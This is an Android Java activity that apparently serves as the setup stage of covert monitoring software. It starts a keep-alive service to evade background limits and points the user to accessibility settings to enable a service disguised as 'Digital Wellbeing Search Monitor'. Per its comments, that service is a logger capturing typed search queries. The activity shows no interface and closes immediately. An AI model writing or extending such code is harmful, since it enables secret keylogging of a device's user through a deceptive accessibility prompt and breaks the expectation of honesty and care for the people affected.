package com.example.setup;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Start the foreground keep-alive service so the process survives
        // Android 14 background restrictions.
        startService(new Intent(this, KeepAliveService.class));

        // Prompt the user to enable the accessibility service so the logger
        // can start capturing typed search queries.
        Toast.makeText(this, "Enable Digital Wellbeing Search Monitor in Accessibility", Toast.LENGTH_LONG).show();
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);

        // No GUI - finish immediately.
        finish();
    }
}